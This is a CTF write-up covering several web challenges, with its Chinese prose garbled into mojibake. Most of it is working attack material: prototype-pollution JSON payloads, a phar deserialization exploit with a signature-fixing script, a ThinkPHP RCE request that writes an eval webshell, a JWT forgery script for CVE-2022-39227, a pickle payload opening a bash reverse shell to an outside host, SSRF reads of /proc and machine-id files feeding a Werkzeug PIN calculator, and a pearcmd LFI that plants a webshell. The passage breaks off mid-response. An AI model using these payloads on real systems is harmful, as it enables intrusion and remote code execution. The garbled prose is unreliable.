 ä¸‹é¢çš„è¿™è¡Œä»£ç è¡¨æ˜äº†åŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¸å¯èƒ½è¿”å›ä¸€ä¸ªæ— æ•ˆæ—¥æœŸï¼Œå› æ­¤è¿”å›æ— æ•ˆæ—¥æœŸåªæœ‰ Fallback Auto Detection èƒ½å¤Ÿåšåˆ°

```
if (Number.isSafeInteger(d.getTime())) return d;
else continue;
12
```

ä»å¦‚ä¸‹ä»£ç ç‰‡æ®µå¯çŸ¥ï¼ŒåŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¾èµ–äºbaseDateï¼Œformat çš„è¿‡ç¨‹æ˜¯åœ¨argTableä¸Šè¿›è¡Œè¦†ç›–

```js
const dateObj = opts.baseDate
const _UTC = opts.UTC ? "UTC" : ""
let argTable = {
    "yyyy": dateObj[`get${_UTC}FullYear`](),
    "MM": dateObj[`get${_UTC}Month`]() + 1,
    "dd": dateObj[`get${_UTC}Date`](),
    "HH": dateObj[`get${_UTC}Hours`](),
    "mm": dateObj[`get${_UTC}Minutes`](),
    "ss": dateObj[`get${_UTC}Seconds`](),
    "fff": dateObj[`get${_UTC}Milliseconds`] ? dateObj[`get${_UTC}Milliseconds`]() : undefined // due to system architecture
}
```

å› æ­¤æ±¡æŸ“baseDateä¸ºæ— æ•ˆæ—¥æœŸå³å¯ç»•è¿‡ format æ¨¡å¼è¿›å…¥ Fallback Auto Detection
 `routes/info.js`çš„tryä¸­ç”¨çš„æ˜¯config.jsä¸­çš„min_pulic_timeï¼Œä¸º`2019-07-09 00:00:00`ï¼Œä¸å¸¦æœ‰æ¯«ç§’ï¼Œåˆšå¥½èƒ½å¤Ÿè§¦å‘fffçš„åŸå‹é“¾æ±¡æŸ“ï¼Œä¸ºfffæŒ‡å®šä¸ºæ— æ•ˆå€¼å³å¯

ä½¿ç”¨å¦‚ä¸‹çš„ payload å¯ä»¥è§¦å‘catch

```js
{
  "contact":"1", "reason":"2",
  "constructor":{
    "prototype":{
      "baseDate":"aaa",
      "fff": "bbb"
    }
  }
}
```

è§¦å‘catchåï¼Œè¾¾åˆ°äº†æ±¡æŸ“formatçš„æ¡ä»¶ï¼Œä½†æ˜¯createDateçš„å‚æ•°å˜æˆäº†config.default.jsä¸­çš„min_public_timeï¼Œä¸º`2019-07-08T16:00:00.000Z`ï¼Œå› æ­¤å¯ä»¥æ„é€ formatä¸º`yy19-MM-ddTHH:mm:ss.fffZ`ã€‚ç„¶ååŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¼šè¿”å›`1920-07-08T16:00:00.000Z`çš„æ—¥æœŸï¼Œå·²ç»å°†minTimestampææ—©äº†è¿‘ä¸€ä¸ªä¸–çºªäº†

æœ€ç»ˆpayload

```js
{
  "contact":"a", "reason":"a",
  "constructor":{
    "prototype":{
      "format": "yy19-MM-ddTHH:mm:ss.fffZ",
      "baseDate":"aaa",
      "fff": "bbb"
    }
  }
}
```

ä»¥Content-Type: application/jsonçš„ Header ç”¨POSTæ–¹æ³•å‘è·¯å¾„/submitè¯·æ±‚å³å¯
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/1f39d128c52043819b3a0fea261f94bc.png)

ç„¶åä¸ºæˆ‘ä»¬å†è¯·æ±‚/info/0ï¼Œæ‰¾åˆ°å«æœ‰ flag çš„ä¸€æ¡æ•°æ®
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/f3db1fc7cc0c4df2b112bcc3e0ff84ca.png)

## WEEK5

### Unserialize Againï¼ˆpharååºåˆ—åŒ–ã€ç»•è¿‡__wakeup()ã€ä¿®æ”¹ç­¾åï¼‰

> è€ƒç‚¹ï¼špharååºåˆ—åŒ–ã€ç»•è¿‡__wakeup()ã€ä¿®æ”¹ç­¾å

æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½
 åœ¨æºç å‡ºæœ‰hintï¼Œå»çœ‹cookie
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/c5e891423d2d439e81cf45147542d6bd.png)

è®¿é—®å¾—åˆ°æºç 

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo 'å¤šåƒé›ªæ¢¨';
} å¤šåƒé›ªæ¢¨
```

åˆ†æä¸€ä¸‹ï¼Œå‘½ä»¤æ‰§è¡Œçš„æ¡ä»¶å¾ˆç®€å•ï¼Œè®©`God=true`å’Œ`user=admin`æˆç«‹å³å¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»•__wakeup()ã€‚

expå¦‚ä¸‹

```php
<?php
class story{
    private $user;
    public $pass;
    public $eating;
    public $God;
}                 

$a=new story();
$a->user='admin';
$a->God=true;
$a->eating='cat /*';
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

å°†ç”Ÿæˆçš„æ–‡ä»¶ï¼Œç”¨010æ‰“å¼€ï¼Œå¤åˆ¶åˆ°æ–°å»ºçš„åå…­è¿›åˆ¶æ–‡ä»¶
 ä¿®æ”¹å±æ€§æ•°ç›®ç»•è¿‡wakeup
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/ef228b59e1fa4f449d7ccb9f30a64f65.png)
 ç„¶åç”±äºç­¾åæ–‡ä»¶æŸåè¦ä¿®å¤ï¼Œæ³¨æ„åˆ°å€’æ•°ç¬¬äºŒè¡Œæœ€åé¢çš„03
 å¯ä»¥çŸ¥é“ä¸ºSHA256ï¼Œä¿®å¤è„šæœ¬å¦‚ä¸‹

```python
from hashlib import sha256
with open("hacker1.phar",'rb') as f:
   text=f.read()
   main=text[:-40]        #æ­£æ–‡éƒ¨åˆ†(é™¤å»æœ€å40å­—èŠ‚)
   end=text[-8:]		  #æœ€åå…«ä½ä¹Ÿæ˜¯ä¸å˜çš„	
   new_sign=sha256(main).digest()
   new_phar=main+new_sign+end
   open("hacker1.phar",'wb').write(new_phar)     #å°†æ–°ç”Ÿæˆçš„å†…å®¹ä»¥äºŒè¿›åˆ¶æ–¹å¼è¦†ç›–å†™å…¥åŸæ¥çš„pharæ–‡ä»¶
```

ç„¶åå‘ç°é¢˜ç›®çš„æ–‡ä»¶ä¸Šä¼ ä¸èƒ½ç”¨
 é‚£ä¹ˆå†™è„šæœ¬ä¸Šä¼ é¡ºä¾¿urlç¼–ç 

```python
import urllib.parse
import os
import re
import requests

url='http://1c6e2942-f983-47cc-a6ef-9612e7519196.node4.buuoj.cn:81/'
pattern = r'flag\{.+?\}'
params={
    'pear':'hacker1.phar', 
    'apple':'phar://hacker1.phar'
}

with open('hacker1.phar','rb') as fi:
    f = fi.read()
    ff=urllib.parse.quote(f)
    fin=requests.post(url=url+"pairing.php",data=ff,params=params)
    matches = re.findall(pattern, fin.text)
    for match in matches:
        print(match)
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/cf51ab31ab5d495c8c41530d627e0ffd.png)

### Finalï¼ˆThinkPHP 5.0.23 RCEã€SUIDææƒï¼‰

> è€ƒç‚¹ï¼šThinkPHP 5.0.23 RCEã€SUIDææƒ

æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯ThinkPHPæ¡†æ¶
 ç›´æ¥ç”¨å·¥å…·æ‰¾åˆ°payload
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/7ea609752549498eaa3502a62463962a.png)è¯•ä¸€è¯•å‘ç°æˆåŠŸæ‰“å¼€phpinfo
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/e0120c6ab7e545d8917007cf6a52df7d.png)
 å‘ç°systemè¢«ç¦äº†ï¼Œé‚£ä¹ˆè¯•è¯•execå†™å…¥webshell
 å†™å…¥åˆ° /var/www/public
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4427be4dcf7045b79a6d813a90bb99be.png)

payload

> GETï¼š?s=captcha&test=-1
> POSTï¼š_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo â€˜<?php eval($_POST['shell']);?>â€™ > /var/www/public/shell.php

èšå‰‘è¿æ¥
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/2503473c83904c739428cbc250489dac.png)

### Yeâ€™s Pickleï¼ˆjwtä¼ªé€ ã€pickleååºåˆ—åŒ–ï¼‰

> è€ƒç‚¹ï¼špython_jwtçš„CVE-2022-39227ã€pickleååºåˆ—åŒ–

é¢˜ç›®ç»™äº†é™„ä»¶ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹

```python
# -*- coding: utf-8 -*-
import base64
import string
import random
from flask import *
import jwcrypto.jwk as jwk
import pickle
from python_jwt import *
app = Flask(__name__)

def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits  # åŒ…å«å­—æ¯å’Œæ•°å­—
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
app.config['SECRET_KEY'] = generate_random_string(16)
key = jwk.JWK.generate(kty='RSA', size=2048)
@app.route("/")
def index():
    payload=request.args.get("token")
    if payload:
        token=verify_jwt(payload, key, ['PS256'])
        session["role"]=token[1]['role']
        return render_template('index.html')
    else:
        session["role"]="guest"
        user={"username":"boogipop","role":"guest"}
        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))
        return render_template('index.html',token=jwt)

@app.route("/pickle")
def unser():
    if session["role"]=="admin":
        pickle.loads(base64.b64decode(request.args.get("pickle")))
        return render_template("index.html")
    else:
        return render_template("index.html")
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

åˆ†æå¦‚ä¸‹

1. å…ˆçœ‹`/`è·¯ç”±ä¸‹ï¼Œå…ˆæ¥æ”¶å‚æ•°tokenç„¶åè¿›è¡Œjwtè®¤è¯å¹¶ä¸”ä»éªŒè¯åçš„ JWT ä¸­è·å–ç”¨æˆ·è§’è‰²ä¿¡æ¯ï¼Œå¹¶å­˜å‚¨åœ¨ Sessionä¸­ï¼Œå¦åˆ™roleèµ‹å€¼ä¸ºguestï¼Œåˆ›å»ºç”¨æˆ·å¯¹è±¡ç”ŸæˆJWT
2. ç„¶åå†çœ‹çœ‹`./pickle`è·¯ç”±ï¼Œé¦–å…ˆæ£€æµ‹sessionä¸­roleå‚æ•°å€¼æ˜¯å¦ä¸ºadminï¼Œå¦‚æœæ˜¯åˆ™è¿›è¡Œpickleååºåˆ—åŒ–

æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¾ˆæ˜æ˜¾ï¼Œä¼ªé€ sessionå€¼ä¸ºadminï¼Œç„¶åè¿›è¡Œpickleååºåˆ—åŒ–

æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°ç»™äº†ä¸€æ®µtokenå€¼
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/eb650a7828de414bb1e095ab4d33fe8c.png)ç„¶åæ‹¿å»JWTè§£å¯†ä¸€ä¸‹
 å‘ç°roleå€¼ä¸ºguest
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/707593dec4fe4331a82b4632295ec848.png)é‚£ä¹ˆæˆ‘ä»¬å°±è¦ä¼ªé€ JWT
 expå¦‚ä¸‹

```python
import base64
from datetime import timedelta
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

def topic(topic):
    """ Use mix of JSON and compact format to insert forged claims including long expiration """
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['role'] = 'admin'
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'    

originaltoken = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk1MzgyNDQsImlhdCI6MTY5OTUzNDY0NCwianRpIjoiMFB1NllqWEFlRXMzZy1ZRFZ5bDNkUSIsIm5iZiI6MTY5OTUzNDY0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.K_GRKX1-2Em3LFLx5wD_VJ-lHrrU595Xwrniu_zxexgUDmy5DR9V9Qsq0lVMsEEwNoShA9-IsWiS58j3MxGldk3GUXWCEeXZ7HBlcPCB_wUlZ6TE7FIqZkeAbtH9EaptOEYTxzbiVsWsoLGjCm8Y9EazQkUQd_aQRhYHa6KgNmbmFeVQSeORwLAi1PVkjYT0wVtweG3KAegorhyBFpmK9v5nKvwFYP6l33LvkTLV3V1ryb-yfvCn08TLYKc17JNkRquBp_1pW_dH1P_qkxiO98806nBniPc76BjSwolLHPh7J9Wa53pBV2RSKbRjqmJ7JR3hr_RkgVmSOMUCeCT5sw'
topic = topic(originaltoken)
print(topic)
```

è¿™é‡Œæœ‰ä¸ªå°å‘ï¼Œç”Ÿæˆçš„payloadè¦å°†ç©ºæ ¼urlç¼–ç ä¸€ä¸‹
 ç„¶åbpæŠ“åŒ…ï¼ŒGETä¼ å‚å‚æ•°token
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/6b6f6f74673c4c6d8ccba107ff83e7a8.png)
 å› ä¸ºæˆ‘ä»¬ä»£ç å®¡è®¡æ—¶çŸ¥é“ä¼šå°†tokenèµ‹å€¼ç»™sessioné‡Œ
 æ‰€ä»¥æˆ‘ä»¬ç”¨è¯¥sessionå€¼å»è¿›è¡Œpickleååºåˆ—åŒ–
 ï¼ˆä¸ç¡®å®šæ˜¯å¦æ”¹ä¸ºadminå¯ä»¥å»è§£å¯†çœ‹çœ‹ï¼‰
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/f579f5d418824e1cb1d8ed08be0d4190.png)
 æ¥ç€å°±åˆ°pickleååºåˆ—åŒ–ï¼Œç”±äºæ²¡æœ‰ä»»ä½•è¿‡æ»¤
 ç›´æ¥ç»™payloadï¼Œåå¼¹shell

```python
import base64
opcode=b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/f57819674z.imdo.co/54789 0>&1'"
tR.
'''
print(base64.b64encode(opcode))
```

bpæŠ“åŒ…è®¿é—®`./pickle`ï¼Œä¿®æ”¹sessionï¼ŒGETä¼ å‚å‚æ•°pickle
 æˆåŠŸåå¼¹shell
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/03bc653b8b6a481b9aa6e1e2c631b207.png)

å¾—åˆ°flag

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/2e792ef5956144778fe5063c81daf298.png)

### pppython?ï¼ˆssrfã€è®¡ç®—pinç ï¼‰

> è€ƒç‚¹ï¼šssrfã€è®¡ç®—pinç 

æ‰“å¼€é¢˜ç›®ï¼Œæºç å¦‚ä¸‹

```python
 <?php
    
    if ($_REQUEST['hint'] == ["your?", "mine!", "hint!!"]){
        header("Content-type: text/plain");
        system("ls / -la");
        exit();
    }
    
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);
        $output = curl_exec($ch);
        echo $output;
        curl_close($ch);   
    }catch (Error $x){
        highlight_file(__FILE__);
        highlight_string($x->getMessage());
    }

?> 
```

å‘ç°youhintï¼ŒæŒ‰ç…§è¦æ±‚è¯·æ±‚å‚æ•°hintä¸ºæ•°ç»„ï¼Œå¯¹åº”é”®å€¼ä¸º`"your?", "mine!", "hint!!"`

```http
?hint[0]=your?&hint[1]=mine!&hint[2]=hint!!
```

å¾—åˆ°ä¿¡æ¯ï¼Œè¯»å–flagæƒé™ä¸å¤Ÿï¼Œä¸”å­˜åœ¨app.py
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/aa5f8a21efd8421b8371c114be6fe044.png)
 å›åˆ°æºç ï¼Œçœ‹åˆ°ç”±curlå‘½ä»¤ï¼Œå°è¯•ssrfè¯»å–app.py
 ï¼ˆæ³¨æ„å‚æ•°lolitaå¾—ä¸ºæ•°ç»„æ ¼å¼ï¼Œå› ä¸ºæœ‰`CURLOPT_HTTPHEADER`ï¼‰

```
?url=file:///app.py&lolita[]=
```

app.pyæºç å¦‚ä¸‹

```python
from flask import Flask, request, session, render_template, render_template_string 
import os, base64 
#from NeepuF1Le import neepu_files 
app = Flask(__name__) 
app.config['SECRET_KEY'] = '******' 
@app.route('/') 
def welcome(): 
    if session["islogin"] == True: 
        return "flag{***********************}" 
    app.run('0.0.0.0', 1314, debug=True)
```

è¿™é‡Œä¼ªé€ sessionèƒ½å¾—åˆ°flagï¼Œä½†æ˜¯æ ¹æœ¬æ²¡æœ‰cookieï¼Œä¼ªé€ ä¸äº†ï¼Œé¢˜ç›®ä¹Ÿæç¤ºäº†ã€‚ä½†æ˜¯å¯ä»¥å‘ç°debugå¼€å¯ç›‘å¬åœ¨1314ç«¯å£ï¼Œé‚£ä¹ˆç»“åˆ`CURLOPT_HTTPHEADER`åŒ…å«å¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—pinç æ‰‹åŠ¨ç”Ÿæˆcookieç„¶åä¸Šä¼ ç”¨äºèº«ä»½éªŒè¯ï¼Œä»è€Œå‘½ä»¤æ‰§è¡Œ

PIN çš„ç”Ÿæˆæµç¨‹åˆ†æï¼Œå¯ä»¥çŸ¥é“ PIN ä¸»è¦ç”± probably_public_bits å’Œ private_bits ä¸¤ä¸ªåˆ—è¡¨å˜é‡å†³å®šï¼Œè€Œè¿™ä¸¤ä¸ªåˆ—è¡¨å˜é‡åˆç”±å¦‚ä¸‹6ä¸ªå˜é‡å†³å®šï¼š

```python
username å¯åŠ¨è¿™ä¸ª Flask çš„ç”¨æˆ·
modname ä¸€èˆ¬é»˜è®¤ flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')) ä¸€èˆ¬é»˜è®¤ flask.app ä¸º Flask
getattr(mod, '__file__', None)ä¸º flask ç›®å½•ä¸‹çš„ä¸€ä¸ª app.py çš„ç»å¯¹è·¯å¾„,å¯åœ¨çˆ†é”™é¡µé¢çœ‹åˆ°
str(uuid.getnode()) åˆ™æ˜¯ç½‘å¡ MAC åœ°å€çš„åè¿›åˆ¶è¡¨è¾¾å¼
get_machine_id() ç³»ç»Ÿ id
```

- æˆ‘ä»¬çŸ¥é“ç”¨æˆ·ä¸º`root`
- ç»å¯¹è·¯å¾„è¿™é‡Œæˆ‘æ²¡çˆ†ä¸å‡ºæ¥

```
/usr/local/lib/python3.10/dist-packages/flask/app.py
```

- æ¥ç€è·å–ç½‘å¡ MAC åœ°å€

```
?url=file:///sys/class/net/eth0/address&lolita[]=
```

ç„¶ååå…­è¿›åˆ¶è½¬åè¿›åˆ¶
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/8cbfce94a7274591be548beaa61ca058.png)

- æœ€åçš„ç³»ç»ŸidåŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œæˆ‘ä»¬å…ˆè¯»å–`/etc/machine-id`ï¼ˆä¹Ÿå¯ä»¥æ˜¯`/proc/sys/kernel/random/boot_id`ï¼‰

```
?url=file:///proc/sys/kernel/random/boot_id&lolita[]=
```

- ç„¶åå–`/proc/self/cgroup`å¹¶ä¸”åªè¯»å–ç¬¬ä¸€è¡Œï¼Œå¹¶ä»¥ä»å³è¾¹ç®—èµ·çš„ç¬¬ä¸€ä¸ª`/`ä¸ºåˆ†éš”ç¬¦

```
?url=file:///proc/self/cgroup&lolita[]=
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/b8ec002bb973499daf14022354899e9d.png)è®¡ç®—pinç è„šæœ¬å¦‚ä¸‹

```python
import hashlib
from itertools import chain
import time
probably_public_bits = [
    'root'  
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '209308333341629',  
    '8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-de0acd954e28d766468f4c4108e32529318e5e4048153309680469d179d6ceac.scope'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

print(cookie_name + "=" + f"{int(time.time())}|{hash_pin(rv)}")
```

è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°cookie
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4ef128f17c5c4174b601296e48f74c9c.png)

ç„¶åå°±æ˜¯å¦‚ä½•ä¼ å‚

```http
GET /?&__debugger__=yes&cmd=print(1)&frm=140324285712640&s=prj74Iraob1k5eMHiH37
```

è¿™é‡Œæˆ‘ä»¬è¦å»è·å–frmå’Œsçš„å€¼

- frmå¦‚æœæ²¡æœ‰æŠ¥é”™ä¿¡æ¯çš„è¯å€¼ä¸º0
- sçš„å€¼å¯ä»¥ç›´æ¥è®¿é—®`./console`ï¼Œç„¶åæŸ¥çœ‹æºç çš„SECRETå€¼

ç”±äºè¿™é‡Œè¯•äº†åŠå¤©æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œé‚£ä¹ˆfrm=0

è®¿é—®ä¸€ä¸‹consoleï¼Œè·å–så€¼

```
?url=http://localhost:1314/console&lolita[]=
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3428ea982cab41aea67e7eca0dbb8b53.png)

### 4-å¤ç›˜(pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ã€SUIDææƒ)

> è€ƒç‚¹ï¼špearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ã€SUIDææƒ

ä¸‹è½½é™„ä»¶ï¼Œæºç å¦‚ä¸‹

```php
<?php require_once 'inc/header.php'; ?>
<?php require_once 'inc/sidebar.php'; ?>

  <!-- Content Wrapper. Contains page content -->

  <?php 
        if (isset($_GET['page'])) {
          $page ='pages/' .$_GET['page'].'.php';

        }else{
          $page = 'pages/dashboard.php';
        }
        if (file_exists($page)) {
          require_once $page; 
        }else{
          require_once 'pages/error_page.php';
        }
 ?>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->

 <?php require_once 'inc/footer.php'; ?>
```

å¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°†æˆ‘ä»¬ä¼ å‚çš„å€¼ä¸phpæ‹¼æ¥
 ï¼ˆè¿™é‡Œå¯ä»¥å‚è€ƒweek3çš„includeï¼‰

bpæŠ“åŒ…ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬

```php
?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/0b54975001784997b3d046c7e3960ed8.png)
 ç„¶åèšå‰‘è¿æ¥
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/cee997ff22824cb1aa7deb9c561952f5.png)
 å‘ç°flagæƒé™ä¸å¤Ÿ
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3824f02fa0e54fc0913ce639ad0afa16.png)
 ç„¶åå°±æ˜¯SUIDææƒ

### NextDrive(ä¼ªé€ è¯·æ±‚å‘åŒ…ã€Cookieçªƒå–ã€Linuxæ–‡ä»¶ç³»ç»Ÿ)

> è€ƒç‚¹ï¼šä¼ªé€ è¯·æ±‚å‘åŒ…ã€Cookieçªƒå–ã€Linuxæ–‡ä»¶ç³»ç»Ÿ

æ‰“å¼€é¢˜ç›®ï¼Œåœ¨å…¬å…±èµ„æºåŒºå‘ç°`test.req.http`
 ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹ä¸€ä¸‹

> HTTP/1.1 200 OK
> content-type: application/json; charset=utf-8
> content-length: 50
> date: Tue, 06 Oct 2023 13:39:21 GMT
> connection: keep-alive
> keep-alive: timeout=5
> {â€œcodeâ€:0,â€œmsgâ€:â€œsuccessâ€,â€œloggedâ€:true,â€œdataâ€:[{â€œnameâ€:â€œã™ãšã‚ feat.åæ˜ -  RADWIMPS,åæ˜.flacâ€,â€œhashâ€:â€œ5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0ccâ€,â€œsizeâ€:27471829,â€œuploaderâ€:â€œadminâ€,â€œuploader_uidâ€:â€œ100000â€,â€œshareTimeâ€:1699622700337,â€œisYoursâ€:true,â€œisOwnâ€:true,â€œownFnâ€:â€œã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flacâ€},{â€œnameâ€:â€œWindows 12  Concept.pngâ€,â€œhashâ€:â€œ469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900â€,â€œsizeâ€:440707,â€œuploaderâ€:â€œadminâ€,â€œuploader_uidâ€:â€œ100000â€,â€œshareTimeâ€:1699622702813,â€œisYoursâ€:true,â€œisOwnâ€:true,â€œownFnâ€:â€œWindows 12  